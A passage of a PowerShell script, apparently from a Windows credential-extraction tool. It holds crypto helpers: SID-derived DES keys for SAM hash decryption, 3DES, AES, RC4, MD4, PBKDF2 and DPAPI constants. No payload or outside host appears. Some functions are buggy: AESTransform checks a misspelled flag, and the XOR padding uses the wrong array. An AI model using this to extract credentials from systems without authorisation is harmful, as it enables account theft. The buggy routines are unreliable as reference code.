<########################################################################################################>
<########################################################################################################>
<#
<# THESE FUNCTIONS ARE REQUIRED FOR SOME CALCULATIONS BUT NOT INTERESTING FOR UNDERSTANDING WINDOWS SECRETS #>
<#
<########################################################################################################>
<########################################################################################################>

# On older PS Version BigInteger type doesn't exist
# Implement BigInteger XOR with bytes array representation
function BigIntBooleanXor($BytesA, $BytesB)
{
	If ($BytesA.Length -gt $BytesB.Length)
	{
		$Len = $BytesA.Length
		$BytesB = ((,[byte]0) * ($Len - $BytesB.Length)) + $BytesB
	}
	Else
	{
		$Len = $BytesB.Length
		$BytesB = ((,[byte]0) * ($Len - $BytesA.Length)) + $BytesB
	}
	
	$Bytes = @()
	For ($i = 0; $i -lt $Len; $i += 1)
	{
		$x = [Int32]$BytesA[$i]
		$y = [Int32]$BytesB[$i]
		
		$z = ($x -bxor $y)
		
		$Bytes += $z
	}
	
	If ($Bytes[$Bytes.Length-1] -eq [byte]0) { $Bytes = $Bytes[0..$($Bytes.Length-2)] }
	return $Bytes
}

function HexStringToBytes($HexString)
{
	$Bytes = New-Object byte[] ($HexString.Length / 2)

	For ($i=0; $i -lt $HexString.Length; $i+=2)
	{
		$Bytes[$i/2] = [Convert]::ToByte($HexString.Substring($i, 2), 16)
	}

	return $Bytes
}

function Pad($Value)
{
	If (($Value -band 3) -gt 0) { return ($Value + ($Value -band 3)) }
	Else { return $Value }
}

function Unpad($Bytes)
{
	$NBBytesToRemove = [Uint32]$Bytes[$Bytes.Length-1]
	return ($Bytes[0..$($Bytes.Length-$NBBytesToRemove-1)])
}

function Shift($Value, $Num)
{
	return ([Math]::Floor($Value * [Math]::Pow(2, $Num)))
}

<#
	DES encryption/decryption : Block = 64 bits, Key = 64 bits, Mode = "CBC"
#>
function STRToKey($S)
{
	$Key = @();
	$Key += (Shift ([int]($S[0])) -1)
	$Key += ((Shift ([int]($S[0]) -band 0x01) 6) -bor (Shift ([int]($S[1])) -2))
	$Key += ((Shift ([int]($S[1]) -band 0x03) 5) -bor (Shift ([int]($S[2])) -3))
	$Key += ((Shift ([int]($S[2]) -band 0x07) 4) -bor (Shift ([int]($S[3])) -4))
	$Key += ((Shift ([int]($S[3]) -band 0x0F) 3) -bor (Shift ([int]($S[4])) -5))
	$Key += ((Shift ([int]($S[4]) -band 0x1F) 2) -bor (Shift ([int]($S[5])) -6))
	$Key += ((Shift ([int]($S[5]) -band 0x3F) 1) -bor (Shift ([int]($S[6])) -7))
	$Key += ([int]($S[6]) -band 0x7F)
	0..7 | %{
		$Key[$_] = ((Shift $Key[$_] 1) -band 0xFE)
		}

	return $Key
}

function SIDToDESKeys($SID)
{
	$Key = [BitConverter]::GetBytes($SID)
	$S1 = @()
	$S2 = @()
	$S1 += $Key[0]; $S1 += $Key[1]; $S1 += $Key[2]; $S1 += $Key[3]; $S1 += $Key[0]; $S1 += $Key[1]; $S1 += $Key[2]
	$S2 += $Key[3]; $S2 += $Key[0]; $S2 += $Key[1]; $S2 += $Key[2]; $S2 += $Key[3]; $S2 += $Key[0]; $S2 += $Key[1]

	return ((STRToKey $S1),(STRToKey $S2))
}

function DESTransform($Key, $Data, $IV, $DoEncrypt)
{
    $DES = New-Object Security.Cryptography.DESCryptoServiceProvider
    $DES.Mode = [Security.Cryptography.CipherMode]::ECB
    $DES.Padding = [Security.Cryptography.PaddingMode]::None
    $DES.Key = $Key
    $DES.IV = $IV
    $Transform = $Null
    If ($DoEncrypt) { $Transform = $DES.CreateEncryptor() }
    Else { $Transform = $DES.CreateDecryptor() }
    $Result = $Transform.TransformFinalBlock($Data, 0, $Data.Length)

    return $Result
}

<#
	Triple DES encryption/decryption : Block = 64 bits, Key = 192 bits, Mode = "ECB" or "CBC"
#>
function TripleDESTransform($Key, $Data, $IV, $Mode, $DoEncrypt)
{
    $DES = New-Object Security.Cryptography.TripleDESCryptoServiceProvider
    $DES.Mode = $Mode
    $DES.Padding = [Security.Cryptography.PaddingMode]::None
    $DES.Key = $Key
    $DES.IV = $IV
    $Transform = $Null
    If ($DoEncrypt) { $Transform = $DES.CreateEncryptor() }
    Else { $Transform = $DES.CreateDecryptor() }
    $Result = $Transform.TransformFinalBlock($Data, 0, $Data.Length)

    return $Result
}

<#
	AES encryption/decryption : Block = 128 bits, Key = 128 or 256 bits, Mode = "CBC"
#>
function AESTransform($Key, $Data, $IV, $DoEncrypt)
{
    $AES = New-Object Security.Cryptography.AESCryptoServiceProvider
    $AES.Mode = [Security.Cryptography.CipherMode]::CBC
    $AES.Padding = [Security.Cryptography.PaddingMode]::Zeros
    $AES.Key = $Key
    $AES.IV = $IV
    $Transform = $Null
    If ($DoEncrpt) { $Transform = $AES.CreateEncryptor() }
    Else { $Transform = $AES.CreateDecryptor() }
    If (($Data.Length/16) -is [int])
    {
        $Result = New-Object byte[] $Data.Length
    }
    Else
    {
        $Result = New-Object byte[] (([System.Math]::Floor($Data.Length/16) * 16) + 16)
    }
    For ($i = 0; $i -lt $Data.Length; $i = $i+16)
    {
        $Block = $Data[$i..$($i+15)]
        if ($Block.Length -ne 16)
        {
            $Block = ($Block + ((,0) * (16-$Block.Length)))
        }
        $Count = $Transform.TransformBlock($Block, 0, 16, $Result, $i);
    }

    return $Result;
}

<#
	RC4 encryption/decryption : Key = 128 bits
#>
function NewRC4($Key)
{
    return New-Object Object |
    Add-Member NoteProperty Key $Key -PassThru |
    Add-Member NoteProperty S $Null -PassThru |
    Add-Member ScriptMethod init {
        if (-not $this.S)
        {
            [byte[]]$this.S = 0..255;
            0..255 | % -begin{ [long]$j=0; } {
                $j = ($j + $this.Key[$($_ % $this.Key.Length)] + $this.S[$_]) % $this.S.Length;
                $Temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $Temp;
                }
        }
    } -PassThru |
    Add-Member ScriptMethod "Transform" {
        $Data = $args[0];
        $this.init();
        $Outbuf = New-Object byte[] $($Data.Length);
        $S2 = $this.S[0..$this.S.Length];
        0..$($Data.Length-1) | % -begin{ $i=0;$j=0; } {
            $i = ($i+1) % $S2.Length;
            $j = ($j + $S2[$i]) % $S2.Length;
            $Temp = $S2[$i]; $S2[$i] = $S2[$j]; $S2[$j] = $Temp;
            $a = $Data[$_];
            $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
            $Outbuf[$_] = ($a -bxor $b);
        }

        return $Outbuf;
    } -PassThru
}

<#
	MD4 encryption/decryption
#>
function Get-MD4($bArray)
{
    $M = New-Object byte[] (([Math]::Floor($bArray.Count/64) + 1) * 64)
    
    $Index = 0
    ForEach ($x in $bArray) { $M[$Index] = $bArray[$Index]; $Index++}
    
    $M[$bArray.Count] = 0x80
    $Last = @([BitConverter]::GetBytes($bArray.Count * 8))
    
    $IndexLast = 0
    $IndexM = $M.Count - 8
    ForEach ($x in $Last) { $M[$IndexM] = $Last[$IndexLast]; $IndexLast++; $IndexM++}

    $A = [Convert]::ToUInt32('0x67452301', 16)
    $B = [Convert]::ToUInt32('0xefcdab89', 16)
    $C = [Convert]::ToUInt32('0x98badcfe', 16)
    $D = [Convert]::ToUInt32('0x10325476', 16)

    # Define 3 auxiliary functions
    function FF([uint32]$X, [uint32]$Y, [uint32]$Z)
    {
        (($X -band $Y) -bor ((-bnot $X) -band $Z))
    }
    function GG([uint32]$X, [uint32]$Y, [uint32]$Z)
    {
        (($X -band $Y) -bor ($X -band $Z) -bor ($Y -band $Z))
    }
    function HH([uint32]$X, [uint32]$Y, [uint32]$Z){
        ($X -bxor $Y -bxor $Z)
    }

    Add-Type -TypeDefinition @'
    public class Rotate32
    {
        public static uint Left(uint a, int b)
        {
            return ((a << b) | (((a >> 1) & 0x7fffffff) >> (32 - b - 1)));
        }
    }
'@

    # Processing message in one-word blocks
    For ($i = 0; $i -lt $M.Count; $i += 64)
    {
        # Save a copy of A/B/C/D
        $AA = $A
        $BB = $B
        $CC = $C
        $DD = $D

        # Round 1 start
        $A = [Rotate32]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0)) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0)) -band [Uint32]::MaxValue, 7)
        $C = [Rotate32]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0)) -band [Uint32]::MaxValue, 11)
        $B = [Rotate32]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0)) -band [Uint32]::MaxValue, 19)

        $A = [Rotate32]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0)) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0)) -band [Uint32]::MaxValue, 7)
        $C = [Rotate32]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0)) -band [Uint32]::MaxValue, 11)
        $B = [Rotate32]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0)) -band [Uint32]::MaxValue, 19)

        $A = [Rotate32]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0)) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0)) -band [Uint32]::MaxValue, 7)
        $C = [Rotate32]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0)) -band [Uint32]::MaxValue, 11)
        $B = [Rotate32]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0)) -band [Uint32]::MaxValue, 19)

        $A = [Rotate32]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0)) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0)) -band [Uint32]::MaxValue, 7)
        $C = [Rotate32]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0)) -band [Uint32]::MaxValue, 11)
        $B = [Rotate32]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0)) -band [Uint32]::MaxValue, 19)

        # Round 2 start
        $A = [Rotate32]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 5)
        $C = [Rotate32]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 9)
        $B = [Rotate32]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 13)

        $A = [Rotate32]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 5)
        $C = [Rotate32]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 9)
        $B = [Rotate32]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 13)

        $A = [Rotate32]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 5)
        $C = [Rotate32]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 9)
        $B = [Rotate32]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 13)

        $A = [Rotate32]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 5)
        $C = [Rotate32]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 9)
        $B = [Rotate32]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 13)

        # Round 3 start
        $A = [Rotate32]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 9)
        $C = [Rotate32]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 11)
        $B = [Rotate32]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 15)

        $A = [Rotate32]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 9)
        $C = [Rotate32]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 11)
        $B = [Rotate32]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 15)

        $A = [Rotate32]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 9)
        $C = [Rotate32]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 11)
        $B = [Rotate32]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 15)

        $A = [Rotate32]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 9)
        $C = [Rotate32]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 11)
        $B = [Rotate32]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 15)


        # Increment start
        $A = ([long]$A + $AA) -band [Uint32]::MaxValue
        $B = ([long]$B + $BB) -band [Uint32]::MaxValue
        $C = ([long]$C + $CC) -band [Uint32]::MaxValue
        $D = ([long]$D + $DD) -band [Uint32]::MaxValue
    }

    # Output start
    $A = ('{0:x8}' -f $A) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
    $B = ('{0:x8}' -f $B) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
    $C = ('{0:x8}' -f $C) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
    $D = ('{0:x8}' -f $D) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
        
    return [byte[]]("$A$B$C$D" -replace '..', '0x$&,' -split ',' -ne '')
}

<#
	PBKDF2 HMAC SHA256
#>
function PBKDF2_HMAC_SHA256 ($Pwd, $Salt, $Length, $Iterations)
{
    # Load C# BCrypt functions
    Add-Type -TypeDefinition @'
		using System;
		using System.Text;
		using System.Runtime.InteropServices;
		
        public class BCrypt
	    {
	        [DllImport("bcrypt.dll", CharSet = CharSet.Auto)]
	        public static extern uint BCryptOpenAlgorithmProvider(
		        ref long phAlgorithm,
		        string pszAlgId,
		        string pszImplementation,
		        long dwFlags);

            [DllImport("bcrypt.dll")]
	        public static extern uint BCryptCloseAlgorithmProvider(
		        long hAlgorithm,
		        long dwFlags);

            [DllImport("bcrypt.dll")]
            public static extern uint BCryptDeriveKeyPBKDF2(
                long hPrf,
                long pbPassword,
                long cbPassword,
                byte[] pbSalt,
                long cbSalt,
                long cIterations,
                byte[] pbDerivedKey,
                long cbDerivedKey,
                long dwFlags);
        }
'@

    # Return Codes
    # "0xC0000000D" = "An invalid parameter was passed to a service or function (STATUS_INVALID_PARAMETER 0xC0000000D)"
    # "0xC0000008" = "An invalid HANDLE was specified (STATUS_INVALID_HANDLE 0xC0000008)"
    # "0xC0000017" = "A memory allocation failure occurred (STATUS_NO_MEMORY 0xC0000017)"
    # "0xC0000225" = "The object was not found (STATUS_NOT_FOUND 0xC0000225)"

    $Algo = [Long]0
    $Open_Flags = [Long]0x00000008  # BCRYPT_ALG_HANDLE_HMAC_FLAG

    $Res = [BCrypt]::BCryptOpenAlgorithmProvider([Ref]$Algo, "SHA256", $Null, $Open_Flags)
    If ($Res -ne 0)
    {
        $HexCode = ("{0:x8}" -f $Res).ToUpper()
        Write-Error "Failed to open algorithm provider with ID 'SHA256' : $HexCode"
        return $Null
    }

    $Key = New-Object byte[] $Length
    $PwdPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Pwd.Length)
    [System.Runtime.InteropServices.Marshal]::Copy($Pwd, 0, $PwdPtr, $Pwd.Length)
    $Res = [BCrypt]::BCryptDeriveKeyPBKDF2($Algo, $PwdPtr, [Long]$Pwd.Length, $Salt, [Long]$Salt.Length, [Long]$Iterations, $Key, [Long]$Length, [Long]0)
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($PwdPtr)
    If ($Res -ne 0)
    {
        $HexCode = ("{0:x8}" -f $Res).ToUpper()
        Write-Error "Failed to derive key : $HexCode"
        return $Null
    }
    
    $Res = [BCrypt]::BCryptCloseAlgorithmProvider($Algo, [Long]0)
    If ($Res -ne 0)
    {
        $HexCode = ("{0:x8}" -f $Res).ToUpper()
        Write-Error "Failed to close algorithm provider : $HexCode"
        return $Null
    }

    return [byte[]]$Key
}

# DPAPI Crypto constants
function LoadCryptoConstants
{
	# Constants from Pypykatz DPAPI/Constants.py

	# Algorithm classes
	$Global:ALG_CLASS_ANY                   = 0
	$Global:ALG_CLASS_SIGNATURE             = [Math]::Floor(1 * [Math]::Pow(2, 13))
	$Global:ALG_CLASS_MSG_ENCRYPT           = [Math]::Floor(2 * [Math]::Pow(2, 13))
	$Global:ALG_CLASS_DATA_ENCRYPT          = [Math]::Floor(3 * [Math]::Pow(2, 13))
	$Global:ALG_CLASS_HASH                  = [Math]::Floor(4 * [Math]::Pow(2, 13))
	$Global:ALG_CLASS_KEY_EXCHANGE          = [Math]::Floor(5 * [Math]::Pow(2, 13))
	$Global:ALG_CLASS_ALL                   = [Math]::Floor(7 * [Math]::Pow(2, 13))

	# Algorithm types
	$Global:ALG_TYPE_ANY                    = 0
	$Global:ALG_TYPE_DSS                    = [Math]::Floor(1 * [Math]::Pow(2, 9))
	$Global:ALG_TYPE_RSA                    = [Math]::Floor(2 * [Math]::Pow(2, 9))
	$Global:ALG_TYPE_BLOCK                  = [Math]::Floor(3 * [Math]::Pow(2, 9))
	$Global:ALG_TYPE_STREAM                 = [Math]::Floor(4 * [Math]::Pow(2, 9))
	$Global:ALG_TYPE_DH                     = [Math]::Floor(5 * [Math]::Pow(2, 9))
	$Global:ALG_TYPE_SECURECHANNEL          = [Math]::Floor(6 * [Math]::Pow(2, 9))
	$Global:ALG_SID_ANY                     = 0
	$Global:ALG_SID_RSA_ANY                 = 0
	$Global:ALG_SID_RSA_PKCS                = 1
	$Global:ALG_SID_RSA_MSATWORK            = 2
	$Global:ALG_SID_RSA_ENTRUST             = 3
	$Global:ALG_SID_RSA_PGP                 = 4
	$Global:ALG_SID_DSS_ANY                 = 0
	$Global:ALG_SID_DSS_PKCS                = 1
	$Global:ALG_SID_DSS_DMS                 = 2
	$Global:ALG_SID_ECDSA                   = 3

	# Block Cipher sub ids
	$Global:ALG_SID_DES                     = 1
	$Global:ALG_SID_3DES                    = 3
	$Global:ALG_SID_DESX                    = 4
	$Global:ALG_SID_IDEA                    = 5
	$Global:ALG_SID_CAST                    = 6
	$Global:ALG_SID_SAFERSK64               = 7
	$Global:ALG_SID_SAFERSK128              = 8
	$Global:ALG_SID_3DES_112                = 9
	$Global:ALG_SID_CYLINK_MEK              = 12
	$Global:ALG_SID_RC5                     = 13
	$Global:ALG_SID_AES_128                 = 14
	$Global:ALG_SID_AES_192                 = 15
	$Global:ALG_SID_AES_256                 = 16
	$Global:ALG_SID_AES                     = 17
	$Global:ALG_SID_SKIPJACK                = 10
	$Global:ALG_SID_TEK                     = 11

	$Global:CRYPT_MODE_CBCI                 = 6       # ANSI CBC Interleaved
	$Global:CRYPT_MODE_CFBP                 = 7       # ANSI CFB Pipelined
	$Global:CRYPT_MODE_OFBP                 = 8       # ANSI OFB Pipelined
	$Global:CRYPT_MODE_CBCOFM               = 9       # ANSI CBC + OF Masking
	$Global:CRYPT_MODE_CBCOFMI              = 10      # ANSI CBC + OFM Interleaved

	$Global:ALG_SID_RC2                     = 2
	$Global:ALG_SID_RC4                     = 1
	$Global:ALG_SID_SEAL                    = 2

	# Diffie - Hellman sub - ids
	$Global:ALG_SID_DH_SANDF                = 1
	$Global:ALG_SID_DH_EPHEM                = 2
	$Global:ALG_SID_AGREED_KEY_ANY          = 3
	$Global:ALG_SID_KEA                     = 4
	$Global:ALG_SID_ECDH                    = 5

	# Hash sub ids
	$Global:ALG_SID_MD2                     = 1
	$Global:ALG_SID_MD4                     = 2
	$Global:ALG_SID_MD5                     = 3
	$Global:ALG_SID_SHA                     = 4
	$Global:ALG_SID_SHA1                    = 4
	$Global:ALG_SID_MAC                     = 5
	$Global:ALG_SID_RIPEMD                  = 6
	$Global:ALG_SID_RIPEMD160               = 7
	$Global:ALG_SID_SSL3SHAMD5              = 8
	$Global:ALG_SID_HMAC                    = 9
	$Global:ALG_SID_TLS1PRF                 = 10
	$Global:ALG_SID_HASH_REPLACE_OWF        = 11
	$Global:ALG_SID_SHA_256                 = 12
	$Global:ALG_SID_SHA_384                 = 13
	$Global:ALG_SID_SHA_512                 = 14

	# Secure Channel sub ids
	$Global:ALG_SID_SSL3_MASTER             = 1
	$Global:ALG_SID_SCHANNEL_MASTER_HASH    = 2
	$Global:ALG_SID_SCHANNEL_MAC_KEY        = 3
	$Global:ALG_SID_PCT1_MASTER             = 4
	$Global:ALG_SID_SSL2_MASTER             = 5
	$Global:ALG_SID_TLS1_MASTER             = 6
	$Global:ALG_SID_SCHANNEL_ENC_KEY        = 7
	$Global:ALG_SID_ECMQV                   = 1

	$Global:ALGORITHMS = @{}
	$Global:ALGORITHMS["CALG_MD2"] = ($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_MD2)
	$Global:ALGORITHMS["CALG_MD4"] = ($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_MD4)
	$Global:ALGORITHMS["CALG_MD5"] = ($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_MD5)
	$Global:ALGORITHMS["CALG_SHA"] = [Uint64]($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_SHA)
	$Global:ALGORITHMS["CALG_SHA1"] = ($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_SHA1)
	$Global:ALGORITHMS["CALG_RSA_SIGN"] = ($Global:ALG_CLASS_SIGNATURE -bor $Global:ALG_TYPE_RSA -bor $Global:ALG_SID_RSA_ANY)
	$Global:ALGORITHMS["CALG_DSS_SIGN"] = ($Global:ALG_CLASS_SIGNATURE -bor $Global:ALG_TYPE_DSS -bor $Global:ALG_SID_DSS_ANY)
	$Global:ALGORITHMS["CALG_NO_SIGN"] = ($Global:ALG_CLASS_SIGNATURE -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_ANY)
	$Global:ALGORITHMS["CALG_RSA_KEYX"] = ($Global:ALG_CLASS_KEY_EXCHANGE -bor $Global:ALG_TYPE_RSA -bor $Global:ALG_SID_RSA_ANY)
	$Global:ALGORITHMS["CALG_DES"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_DES)
	$Global:ALGORITHMS["CALG_3DES_112"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_3DES_112)
	$Global:ALGORITHMS["CALG_3DES"] = [Uint64]($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_3DES)
	$Global:ALGORITHMS["CALG_DESX"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_DESX)
	$Global:ALGORITHMS["CALG_RC2"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_RC2)
	$Global:ALGORITHMS["CALG_RC4"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_STREAM -bor $Global:ALG_SID_RC4)
	$Global:ALGORITHMS["CALG_SEAL"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_STREAM -bor $Global:ALG_SID_SEAL)
	$Global:ALGORITHMS["CALG_DH_SF"] = ($Global:ALG_CLASS_KEY_EXCHANGE -bor $Global:ALG_TYPE_DH -bor $Global:ALG_SID_DH_SANDF)
	$Global:ALGORITHMS["CALG_DH_EPHEM"] = ($Global:ALG_CLASS_KEY_EXCHANGE-bor$Global:ALG_TYPE_DH -bor $Global:ALG_SID_DH_EPHEM)
	$Global:ALGORITHMS["CALG_AGREEDKEY_ANY"] = ($Global:ALG_CLASS_KEY_EXCHANGE -bor $Global:ALG_TYPE_DH -bor $Global:ALG_SID_AGREED_KEY_ANY)
	$Global:ALGORITHMS["CALG_KEA_KEYX"] = ($Global:ALG_CLASS_KEY_EXCHANGE -bor $Global:ALG_TYPE_DH-bor$Global:ALG_SID_KEA)
	$Global:ALGORITHMS["CALG_HUGHES_MD5"] = ($Global:ALG_CLASS_KEY_EXCHANGE -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_MD5)
	$Global:ALGORITHMS["CALG_SKIPJACK"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_SKIPJACK)
	$Global:ALGORITHMS["CALG_TEK"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_TEK)
	$Global:ALGORITHMS["CALG_SSL3_SHAMD5"] = ($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_SSL3SHAMD5)
